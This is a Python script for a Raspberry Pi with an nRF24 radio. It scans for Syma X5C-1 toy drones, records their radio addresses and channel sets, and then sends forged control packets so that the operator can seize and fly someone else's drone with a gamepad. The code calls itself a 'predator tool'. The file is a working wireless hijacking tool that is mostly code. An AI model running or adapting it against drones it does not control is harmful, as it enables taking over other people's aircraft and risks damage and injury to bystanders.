#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os,sys
import time
import threading
import re
from subprocess import Popen, PIPE

from RF24 import *
import RPi.GPIO as GPIO

###########[ CONFIG ][##############

config_cepin=RPI_V2_GPIO_P1_22 # CE PIN
config_cspin=RPI_V2_GPIO_P1_24 # CS PIN

config_joystick='/dev/hidraw0' # Joystick controller (needed for capture)

usbip_server_list=["172.20.1.2", "172.20.1.3"] # Remote hosts that can host the Gamepad with USBIP

####################################


def debug_print(msg):
    if debug:
        print msg

def shell_exec(cmd): 
    process = Popen([cmd], stdout=PIPE,shell=True)
    (output, err) = process.communicate()
    exit_code = process.wait()
    return output

def exp(value, koef=1.01, maximum=255):
    if value < 10:
        return value
    tmp = 160*(koef**(value)) / (koef**maximum)
    tmp = int(tmp) & 0xff
    return int(tmp)


class Radio():
    def __init__(self):
        num_rf_channels = 4
        chans = [0] * num_rf_channels
        start_chans_1 = [0x0a, 0x1a, 0x2a, 0x3a]
        start_chans_2 = [0x2a, 0x0a, 0x42, 0x22]
        start_chans_3 = [0x1a, 0x3a, 0x12, 0x32]
        self.start_chans_list = [start_chans_1, start_chans_2, start_chans_3]

        self.nrf = RF24(config_cepin, config_cspin, BCM2835_SPI_SPEED_8MHZ)
        self.nrf.begin()
        self.nrf.setChannel(1)
        self.nrf.setPALevel(RF24_PA_MAX)
        self.nrf.setAutoAck(False)
        self.nrf.setDataRate(RF24_250KBPS)

    def set_channel(self, channel):
        self.nrf.stopListening()
        time.sleep(0.01)
        self.nrf.setChannel(channel)
        self.nrf.startListening()

    def set_rx(self):
        self.nrf.setAddressWidth(2)
        self.nrf.payloadSize = 15
        self.nrf.disableCRC()
        self.nrf.openReadingPipe(1, 0xAA)

    def set_tx(self, address):
        self.nrf.setAddressWidth(5)
        self.nrf.payloadSize = 10
        self.nrf.setCRCLength(RF24_CRC_16)
        self.nrf.openWritingPipe(address)


class Syma_Scanner():

    def __init__(self):

        self.drones = {}
        self.seen_drones = {}

        debug_print("Initializing radio")
        self.radio = Radio()
        self.radio.set_rx()

    def scan_radio(self):

        print "Searching for Syma X5C-1"

        for start_chans in self.radio.start_chans_list:
            debug_print("Searching in channels "+str(start_chans))

            # Scan the channels known to be Syma XC-1  4 by 4
            for channel in start_chans:    
                self.radio.set_channel(channel)
        
                time.sleep(0.1)
        
                for i in range(10):
                    time.sleep(0.02)
                    while(self.radio.nrf.available()):
        
                        data = self.radio.nrf.read(self.radio.nrf.payloadSize)
                        computed_crc = int(data[5] ^ data[6] ^ data[7] ^ data[8] ^ data[9] ^ data[10] ^ data[11] ^ data[12] ^ data[13]) + 0x55
                        received_crc = data[14]
                        hex_data = str(data).encode('hex')
                        if received_crc == computed_crc:
                            target_address = '0x{:02x}'.format(data[0]) + '{:02x}'.format(data[1]) + '{:02x}'.format(data[2]) + '{:02x}'.format(data[3]) + '{:02x}'.format(data[4])
                            debug_print("Valid frame received on channel " + str(channel) + " with address " + target_address+": " + hex_data)
                            # Add drone to seen list
                            if not target_address in self.drones.keys():
                                self.drones[target_address] = {}
                            # Add channel to seen list
                            if not channel in self.drones[target_address].keys():
                                self.drones[target_address][channel] = True        

    def identify_drones(self):
        consolidated_drones = {}
        for start_chans in self.radio.start_chans_list:
            # Check if a valid frame has been found on each of the expected 4 channels
            for address in self.drones:
                drone = self.drones[address]
                i=0
                for channel in start_chans:
                    if channel in drone.keys():
                        i = i+1
                if (i==4):
                    consolidated_drones[address]=drone.keys()

        # Clean self.drones to keep only the ones that are valid on 4 channels
        self.drones = consolidated_drones

    def display_drones(self):
        if not self.drones:
            print "No drone found"
        for address in self.drones:
            drone = self.drones[address]
            print "Syma X5C-1 Drone found with address " + address + " on channels " + '[%s]' % ', '.join(map(str, drone))
 

    def scan(self):
        self.scan_radio()
        self.identify_drones()
        return self.drones


class Syma_Controller(threading.Thread):
    def __init__(self, address, channels):
        debug_print("Initializing radio")

        self.address = address
        self.channels = channels

        self.radio = Radio()
        self.radio.set_tx(int(self.address, 16))

        self.ch = 0
        self.running = False

        self.aileron = 0
        self.elevator = 0
        self.throttle = 0
        self.rudder = 0

        self.packet = [0] * 10

        self.joystick_controller = Joystick_Controller(self)
        self.joystick_controller.start()

        super(Syma_Controller, self).__init__()

    def exit(self):
        self.release()
        self.joystick_controller.stop()
        self.stopped = True

    def checksum(self, data):
        csum = data[0]
        for i in range(1, len(data)-1, 1):
            csum = (csum ^ data[i])
        return (csum + 0x55) % 256

    def build_packet(self):
        self.packet[0] = self.throttle
        self.packet[1] = self.elevator
        self.packet[2] = self.rudder
        self.packet[3] = self.aileron
        self.packet[4] = 0x40
        self.packet[5] = 0x00#(elevator >> 2) | 0xc0;  // always high rates (bit 7 is rate control)
        self.packet[6] = 0x00#(rudder >> 2)   | (flags & FLAG_FLIP  ? 0x40 : 0x00);
        self.packet[7] = 0x00#aileron >> 2
        self.packet[8] = 0x00
        self.packet[9] = self.checksum(self.packet)

        #print 'Sent Payload: ', '0x{:02x}'.format(self.packet[0]),format(self.packet[1],'02x'),format(self.packet[2],'02x'),format(self.packet[3],'02x'),format(self.packet[4],'02x'),format(self.packet[5],'02x'),format(self.packet[6],'02x'),format(self.packet[7],'02x'),format(self.packet[8],'02x')

    def set_controls(self, aileron, elevator, throttle, rudder):
        self.aileron  = aileron
        self.elevator = elevator
        self.throttle = throttle
        self.rudder   = rudder

    def run(self):
        self.stopped = False
        while (not self.stopped):
            if (self.running):
                self.build_packet()
                
                self.ch += 1
                self.ch = self.ch % 4
                self.radio.nrf.setChannel(self.channels[self.ch])
                
                #debug_print("channel = "+str(self.channels[self.ch])+" - address = "+str(self.address)+" - payload = "+str(self.packet))
                self.radio.nrf.write(bytearray(self.packet))
                time.sleep(0.000001)
            else:
                time.sleep(0.5)

    def capture(self):
        debug_print("Capturing drone "+str(self.address)+" on channels " + '[%s]' % ', '.join(map(str, self.channels)))
        print "Press <START> to release."
        self.running = True

    def release(self):
        if self.running:
            print "Releasing drone "+str(self.address)+" on channels " + '[%s]' % ', '.join(map(str, self.channels))
            self.running = False


class Joystick_Controller(threading.Thread):
    def __init__(self, controller):
        debug_print("Initilizing joystick")
        path = '/dev/'
                
        init_joystick = True
        while (init_joystick):
        
            try:
                file_list = [f for f in os.listdir(path) if f.startswith('hidr')]
                if file_list == []:
                    print ("No existing hidraw device. Trying to connect with USBIP.")
                    if (not self.connect_usbip()):
                        print ("Error: Couldn't connect USBIP device. No joystick available.")
                        exit(-1)
                    time.sleep(1)
                else:
                    joystick_file = path + file_list[-1]
                    print('Joystick detected: '+joystick_file)
                    self.joystick = open(joystick_file, 'r')
                    init_joystick = False
            except:
                print ("Error while initilizing joystick")
                exit(-1)
 
        super(Joystick_Controller, self).__init__()

        self.syma_controller = controller

        print("Everything is ready. Press <START> to capture drone "+str(self.syma_controller.address)+". Press <SELECT> to exit predator tool.")

    def connect_usbip(self):
        found = False

        for ip in usbip_server_list:
            if (not found):
                output =shell_exec('usbip list --remote='+ip)

                regex = r"([-0-9]+): GreenAsia Inc. : MaxFire Blaze2 \(0e8f:0003\)"
                match = re.findall(regex,output)
                if (match):
                    busid = match[0]
                    server = ip
                    found = True
        if found:
            print("GreenAsia Gamepad detected on " + server + " with bus-id=" + busid)
            output = shell_exec('modprobe usbip_host usbip_core')
            output = shell_exec('modprobe vhci_hcd')
        
            output = shell_exec('usbip attach --remote ' + server + ' --busid=' + busid)
            print(output)
            return True
        else:
            print("GreenAsia Gamepad not detected in " + str(usbip_server_list))
            return False

    def stop(self):
        self.stopped = True

    def run(self):
        self.stopped = False
        start_pressed = False
        while (not self.stopped):
            s = self.joystick.read(8)

            if (ord(s[6]) & 0x20):
                if not start_pressed:
                    if self.syma_controller.running:
                        self.syma_controller.release()
                    else:
                        self.syma_controller.capture()
                start_pressed = True
            else:
                start_pressed = False

            if (ord(s[6]) & 0x10):
                self.syma_controller.exit()

            t = 2*(127 - ord(s[3]))
            if t < 0: 
                t = 0
            self.syma_controller.throttle = exp(value=t)

            if (ord(s[6]) & 0x3):
                self.syma_controller.throttle = 255

            t = ord(s[2])
            if t == 128:
                # Neutral
                self.syma_controller.rudder = 0
            elif t < 128:
                # Left Yaw
                self.syma_controller.rudder = 127 - t
            else:
                # Right Yaw
                self.syma_controller.rudder = t

            t = ord(s[1])
            if t == 128:
                # Neutral
                self.syma_controller.elevator = 0
            elif t < 128:
                # Backwards
                self.syma_controller.elevator = 127 - t
            else:
                # Frontwards
                self.syma_controller.elevator = t

            t = ord(s[0])
            if t == 128:
                # Neutral
                self.syma_controller.aileron = 0
            elif t < 128:
                # Roll right
                self.syma_controller.aileron = 127 - t
            else:
                # Roll left
                self.syma_controller.aileron = t
            
            time.sleep(0.0)
        debug_print("End of joystick thread")


if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1]=="-v":
            debug = True
        else:
            debug = False
    else:
        debug = False

    syma_scanner = Syma_Scanner()
    drones=syma_scanner.scan()
    syma_scanner.display_drones()

    #drones = {}
    #drones["a1ca201670"]=[10, 34, 66, 42]

    for drone in drones:
        syma_controller = Syma_Controller(drone, drones[drone])
        syma_controller.start()
        #syma_controller.capture()
